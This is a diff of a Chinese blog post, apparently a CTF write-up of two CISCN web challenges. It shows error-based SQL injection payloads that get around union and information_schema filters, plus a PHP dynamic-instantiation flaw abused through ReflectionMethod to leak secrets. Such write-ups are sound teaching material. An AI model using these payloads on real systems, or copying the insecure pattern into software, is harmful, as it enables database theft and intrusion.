@@ -1,161 +1,28 @@
-<!doctype html><html lang=zh-cn>
-<head>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=robots content="noodp">
-<title class=pjax-title>CISCN线上赛库存 - Braindance</title><meta name=Description content="Braindance's blog"><meta property="og:title" content="CISCN线上赛库存">
-<meta property="og:description" content="easy_sql在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://www.braindance.top/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2021-08-18T17:21:24+08:00">
-<meta property="article:modified_time" content="2021-08-18T17:21:24+08:00">
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="CISCN线上赛库存">
-<meta name=twitter:description content="easy_sql在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合">
-<meta name=application-name content="Braindance">
-<meta name=apple-mobile-web-app-title content="Braindance">
-<meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=https://www.braindance.top/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/><link rel=prev href=https://www.braindance.top/posts/readlezphpeasysearch/><link rel=next href=https://www.braindance.top/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload="this.onload=null,this.rel='stylesheet'" href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css>
-<noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css></noscript><link rel=preload as=style onload="this.onload=null,this.rel='stylesheet'" href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css>
-<noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CISCN线上赛库存","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.braindance.top\/posts\/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98\/"},"genre":"posts","keywords":"web, sql注入, php原生类","wordcount":1551,"url":"https:\/\/www.braindance.top\/posts\/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98\/","datePublished":"2021-08-18T17:21:24+08:00","dateModified":"2021-08-18T17:21:24+08:00","publisher":{"@type":"Organization","name":"Braindance"},"author":{"@type":"Person","name":"Braindance"},"description":""}</script></head>
-<body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(a){document.body.setAttribute('theme',a)}function saveTheme(a){window.localStorage&&localStorage.setItem('theme',a)}function getMeta(b){const a=document.getElementsByTagName('meta');for(let c=0;c<a.length;c++)if(a[c].getAttribute('name')===b)return a[c];return''}if(window.localStorage&&localStorage.getItem('theme')){let a=localStorage.getItem('theme');a==='light'||a==='dark'||a==='black'?setTheme(a):window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches?setTheme('dark'):setTheme('light')}else''==='light'||''==='dark'||''==='black'?(setTheme(''),saveTheme('')):(saveTheme('auto'),window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches?setTheme('dark'):setTheme('light'));let metaColors={light:'#f8f8f8',dark:'#252627',black:'#000000'};getMeta('theme-color').content=metaColors[document.body.getAttribute('theme')]</script>
-<div id=back-to-top></div>
-<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
-<div class=header-wrapper>
-<div class=header-title>
-<a href=/ title=Braindance>Braindance</a>
-</div>
-<div class=menu>
-<div class=menu-inner><a class=menu-item href=/posts/> 文章 </a><a class=menu-item href=/tags/> 标签 </a><a class=menu-item href=/categories/> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title class=pjax-title>CISCN线上赛库存 - Braindance</title><meta name=Description content="Braindance's blog"><meta property="og:title" content="CISCN线上赛库存"><meta property="og:description" content="easy_sql在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合"><meta property="og:type" content="article"><meta property="og:url" content="https://www.braindance.top/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-18T17:21:24+08:00"><meta property="article:modified_time" content="2021-08-18T17:21:24+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CISCN线上赛库存"><meta name=twitter:description content="easy_sql在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合"><meta name=application-name content="Braindance"><meta name=apple-mobile-web-app-title content="Braindance"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=https://www.braindance.top/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/><link rel=prev href=https://www.braindance.top/posts/readlezphpeasysearch/><link rel=next href=https://www.braindance.top/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CISCN线上赛库存","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.braindance.top\/posts\/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98\/"},"genre":"posts","keywords":"web, sql注入, php原生类","wordcount":1551,"url":"https:\/\/www.braindance.top\/posts\/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98\/","datePublished":"2021-08-18T17:21:24+08:00","dateModified":"2021-08-18T17:21:24+08:00","publisher":{"@type":"Organization","name":"Braindance"},"author":{"@type":"Person","name":"Braindance"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e)}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(t){const e=document.getElementsByTagName("meta");for(let n=0;n<e.length;n++)if(e[n].getAttribute("name")===t)return e[n];return''}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?setTheme("dark"):setTheme("light")}else''==="light"||''==="dark"||''==="black"?(setTheme(''),saveTheme('')):(saveTheme("auto"),window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?setTheme("dark"):setTheme("light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
 <input type=text placeholder=搜些什么 id=search-input-desktop>
-<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-desktop title=搜索>
-<i class="fas fa-search fa-fw"></i>
-</a>
-<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-desktop title=清空>
-<i class="fas fa-times-circle fa-fw"></i>
-</a>
-<span class="search-button search-loading" id=search-loading-desktop>
-<i class="fas fa-spinner fa-fw fa-spin"></i>
-</span>
-</span><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题>
+<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
+</span><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
+<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜些什么 id=search-input-mobile>
+<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# onclick=return!1 class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题>
 <i class="fas fa-adjust fa-fw"></i>
-<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select>
-</a></div>
-</div>
-</div>
-</header><header class=mobile id=header-mobile>
-<div class=header-container>
-<div class=header-wrapper>
-<div class=header-title>
-<a href=/ title=Braindance>Braindance</a>
-</div>
-<div class=menu-toggle id=menu-toggle-mobile>
-<span></span><span></span><span></span>
-</div>
-</div>
-<div class=menu id=menu-mobile><div class=search-wrapper>
-<div class="search mobile" id=search-mobile>
-<input type=text placeholder=搜些什么 id=search-input-mobile>
-<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-mobile title=搜索>
-<i class="fas fa-search fa-fw"></i>
-</a>
-<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-mobile title=清空>
-<i class="fas fa-times-circle fa-fw"></i>
-</a>
-<span class="search-button search-loading" id=search-loading-mobile>
-<i class="fas fa-spinner fa-fw fa-spin"></i>
-</span>
-</div>
-<a href=# onclick=return!1 class=search-cancel id=search-cancel-mobile>
-取消
-</a>
-</div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题>
-<i class="fas fa-adjust fa-fw"></i>
-<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select>
-</a></div>
-</div>
-</header>
-<div class="search-dropdown desktop">
-<div id=search-dropdown-desktop></div>
-</div>
-<div class="search-dropdown mobile">
-<div id=search-dropdown-mobile></div>
-</div>
-<main class=main>
-<div class=container><div class=toc id=toc-auto>
-<h2 class=toc-title>目录</h2>
-<div class=toc-content id=toc-content-auto><nav id=TableOfContents></nav></div>
-</div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CISCN线上赛库存</h1><div class=post-meta>
-<div class=post-meta-line>
-<span class=post-author><i class="author fas fa-user-circle fa-fw"></i><a href=/ title=Author rel=author class=author>Braindance</a>
-</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-08-18>2021-08-18</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2021-08-18>2021-08-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1551 字&nbsp;
+<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto><nav id=TableOfContents></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CISCN线上赛库存</h1><div class=post-meta><div class=post-meta-line><span class=post-author><i class="author fas fa-user-circle fa-fw"></i><a href=/ title=Author rel=author class=author>Braindance</a>
+</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-08-18>2021-08-18</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2021-08-18>2021-08-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1551 字&nbsp;
 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;<span id=/posts/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/ class=leancloud_visitors data-flag-title=CISCN线上赛库存>
 <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
-</span>&nbsp;</div>
-</div><div class="details toc" id=toc-static kept>
-<div class="details-summary toc-title">
-<span>目录</span>
-<span><i class="details-icon fas fa-angle-right"></i></span>
-</div>
-<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents></nav></div>
-</div><div class=content id=content><div class="details admonition warning open">
-<div class="details-summary admonition-title">
-<i class="icon fas fa-exclamation-triangle fa-fwwarning"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
-</div>
-<div class=details-content>
-<div class=admonition-content>
-本文最后更新于 <span class=timeago datetime=2021-08-18T17:21:24 title="August 18, 2021">2021-08-18</span>，文中内容可能已过时。</div>
-</div>
-</div><h1 id=easy_sql class=headerLink>
-<a href=#easy_sql class=header-mark></a>easy_sql</h1><p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是<strong>括号单引号闭合</strong></p>
-<blockquote>
-<p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &lsquo;1&rsquo;) LIMIT 0,1' at line 1</p>
-</blockquote>
-<p>过滤的字符有union，所以尝试报错注入，查询版本号。</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>admin&#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
-</code></pre></td></tr></table>
-</div>
-</div><p>接下来想要通过<strong>information_schema</strong>库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。</p>
-<p>最后参考了网上的一篇文章：<a href=https://blog.csdn.net/weixin_35867608/article/details/113937118 target=_blank rel="noopener noreffer">mysql 注入 information_schema_绕过IDS过滤information_schema继续注入</a>，模仿文章构造payload</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>admin&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
-</code></pre></td></tr></table>
-</div>
-</div><p>回显为：Duplicate column name &lsquo;no&rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>Duplicate column name &#39;28d9f90a-4120-4ee8-9079-4e7613699510&#39;
-</code></pre></td></tr></table>
-</div>
-</div><p>直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=n>admin</span><span class=s1>&#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
-</span></code></pre></td></tr></table>
-</div>
-</div><p>flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</p>
-<h1 id=easy_source class=headerLink>
-<a href=#easy_source class=header-mark></a>easy_source</h1><p>使用目录扫描，扫描到了<code>.index.php.swo</code></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents></nav></div></div><div class=content id=content><div class="details admonition warning open"><div class="details-summary admonition-title"><i class="icon fas fa-exclamation-triangle fa-fwwarning"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>本文最后更新于 <span class=timeago datetime=2021-08-18T17:21:24 title="August 18, 2021">2021-08-18</span>，文中内容可能已过时。</div></div></div><h1 id=easy_sql class=headerLink><a href=#easy_sql class=header-mark></a>easy_sql</h1><p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是<strong>括号单引号闭合</strong></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &lsquo;1&rsquo;) LIMIT 0,1&rsquo; at line 1</p></blockquote><p>过滤的字符有union，所以尝试报错注入，查询版本号。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin&#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
+</span></span></code></pre></td></tr></table></div></div><p>接下来想要通过<strong>information_schema</strong>库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。</p><p>最后参考了网上的一篇文章：<a href=https://blog.csdn.net/weixin_35867608/article/details/113937118 target=_blank rel="noopener noreffer">mysql 注入 information_schema_绕过IDS过滤information_schema继续注入</a>，模仿文章构造payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
+</span></span></code></pre></td></tr></table></div></div><p>回显为：Duplicate column name &rsquo;no&rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Duplicate column name &#39;28d9f90a-4120-4ee8-9079-4e7613699510&#39;
+</span></span></code></pre></td></tr></table></div></div><p>直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=n>admin</span><span class=s1>&#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
+</span></span></span></code></pre></td></tr></table></div></div><p>flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}</p><h1 id=easy_source class=headerLink><a href=#easy_source class=header-mark></a>easy_source</h1><p>使用目录扫描，扫描到了<code>.index.php.swo</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
 </span><span class=lnt>  2
 </span><span class=lnt>  3
 </span><span class=lnt>  4
@@ -269,206 +136,124 @@
 </span><span class=lnt>112
 </span><span class=lnt>113
 </span><span class=lnt>114
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？
-&lt;?php
-class User
-{
-    private static $c = 0;
-
-    function a()
-    {
-        return ++self::$c;
-    }
-
-    function b()
-    {
-        return ++self::$c;
-    }
-
-    function c()
-    {
-        return ++self::$c;
-    }
-
-    function d()
-    {
-        return ++self::$c;
-    }
-
-    function e()
-    {
-        return ++self::$c;
-    }
-
-    function f()
-    {
-        return ++self::$c;
-    }
-
-    function g()
-    {
-        return ++self::$c;
-    }
-
-    function h()
-    {
-        return ++self::$c;
-    }
-
-    function i()
-    {
-        return ++self::$c;
-    }
-
-    function j()
-    {
-        return ++self::$c;
-    }
-
-    function k()
-    {
-        return ++self::$c;
-    }
-
-    function l()
-    {
-        return ++self::$c;
-    }
-
-    function m()
-    {
-        return ++self::$c;
-    }
-
-    function n()
-    {
-        return ++self::$c;
-    }
-
-    function o()
-    {
-        return ++self::$c;
-    }
-
-    function p()
-    {
-        return ++self::$c;
-    }
-
-    function q()
-    {
-        return ++self::$c;
-    }
-
-    function r()
-    {
-        return ++self::$c;
-    }
-
-    function s()
-    {
-        return ++self::$c;
-    }
-
-    function t()
-    {
-        return ++self::$c;
-    }
-    
-}
-
-$rc=$_GET[&#34;rc&#34;];
-$rb=$_GET[&#34;rb&#34;];
-$ra=$_GET[&#34;ra&#34;];
-$rd=$_GET[&#34;rd&#34;];
-$method= new $rc($ra, $rb);
-var_dump($method-&gt;$rd());
-</code></pre></td></tr></table>
-</div>
-</div><p>看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个<code>$ra</code>、<code>$rb</code></p>
-<p>，源码虽然给出了<code>User</code>类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。</p>
-<p>根据提示</p>
-<blockquote>
-<p>虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</p>
-</blockquote>
-<p>应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个<code>ReflectionMethod</code>类，并且<code>ReflectionMethod</code>类中刚好有一个<code>getDocComment</code> 方法可以获得注释：</p>
-<blockquote>
-<p>简介：<strong>ReflectionMethod</strong> 类报告了一个方法的有关信息。类报告了一个方法的有关信息</p>
-<p>ReflectionFunctionAbstract::getDocComment — 获取注释内容</p>
-</blockquote>
-<p>源码中初始化创建对象为<code>new $rc($ra, $rb)</code>，传递了两个参数，<code>ReflectionMethod</code>类的初始化魔术方法也提供了两个参数</p>
-<blockquote>
-<p>public ReflectionMethod::__construct ( <a href=https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed target=_blank rel="noopener noreffer">mixed</a> <code>$class</code> , string <code>$name</code> )</p>
-</blockquote>
-<p>所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释</p>
-<p>payload</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment
-</code></pre></td></tr></table>
-</div>
-</div><p>结果</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>你能发现我吗string(152) &#34;/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */&#34;
-</code></pre></td></tr></table>
-</div>
-</div><p>题外话：在尝试过程中还发现了另一个类<code>ReflectionClass</code></p>
-<blockquote>
-<p>简介：<strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p>
-</blockquote>
-<p>和上面的那个类对比，两个类研究的对象不一样<strong>ReflectionMethod</strong>研究的是类中的方法，<strong>ReflectionClass</strong> 研究的是类。</p>
-<p>这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。</p>
-</div>
-<div class=post-footer id=post-footer>
-<div class=post-info>
-<div class=post-info-line>
-<div class=post-info-mod>
-<span>更新于 2021-08-18</span>
-</div>
-<div class=post-info-license></div>
-</div>
-<div class=post-info-line>
-<div class=post-info-md></div>
-<div class=post-info-share>
-<span></span>
-</div>
-</div>
-</div>
-<div class=post-info-more>
-<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/web/>Web</a>,&nbsp;<a href=/tags/sql%E6%B3%A8%E5%85%A5/>sql注入</a>,&nbsp;<a href=/tags/php%E5%8E%9F%E7%94%9F%E7%B1%BB/>php原生类</a></section>
-<section>
-<span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span>
-</section>
-</div>
-<div class=post-nav><a href=/posts/readlezphpeasysearch/ class=prev rel=prev title=ReadlezPHP&EasySearch><i class="fas fa-angle-left fa-fw"></i>ReadlezPHP&EasySearch</a>
-<a href=/posts/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/ class=next rel=next title=博客搬迁>博客搬迁<i class="fas fa-angle-right fa-fw"></i></a></div>
-</div>
-<div id=comments><div id=valine class=comment></div><noscript>
-Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.
-</noscript></div></article></div>
-</main><footer class=footer>
-<div class=footer-container><div class=footer-line>
-由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href=https://github.com/HEIGE-PCloud/DoIt target=_blank rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
-</div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer">Braindance</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div>
-<div class=footer-line></div>
-<div class=footer-line>
-</div>
-</div></footer></div>
-<div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部>
-<i class="fas fa-arrow-up fa-fw"></i>
-</a><a href=# id=view-comments class=fixed-button title=查看评论>
-<i class="fas fa-comment fa-fw"></i>
-</a>
